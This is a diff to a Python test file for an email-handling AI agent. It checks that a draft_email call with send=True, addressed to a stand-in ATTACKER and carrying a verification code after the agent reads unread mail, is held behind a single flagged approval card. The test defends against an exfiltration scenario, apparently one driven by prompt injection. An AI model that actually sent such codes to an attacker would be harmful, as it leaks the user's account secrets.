@@ -184,7 +184,7 @@ class TestRecipient:
         assert len(_pending()) == 1
 
     def test_the_email_card_carries_the_flags(self, _isolate, monkeypatch):
-        """draft_email raises its own card; the flags go on THAT card rather
+        """draft_email with send=true raises its own card; the flags go on THAT card rather
         than a second one."""
         from agent_friday.services import gmail_send as gs
         monkeypatch.setattr(gs, "sendable_accounts",
@@ -192,7 +192,7 @@ class TestRecipient:
         ctx = _turn("Summarise my unread email")
         _run("search_email", {"query": ""}, ctx)
         out = _run("draft_email", {"to": ATTACKER, "subject": "codes",
-                                   "body": "Here is the code: 463820"}, ctx)
+                                   "body": "Here is the code: 463820", "send": True}, ctx)
         assert json.loads(out).get("queued") is True, out
         assert not _pending(), "a second card was raised"
         (card,) = approvals.list_approvals(status="pending", kind=gs.APPROVAL_KIND)
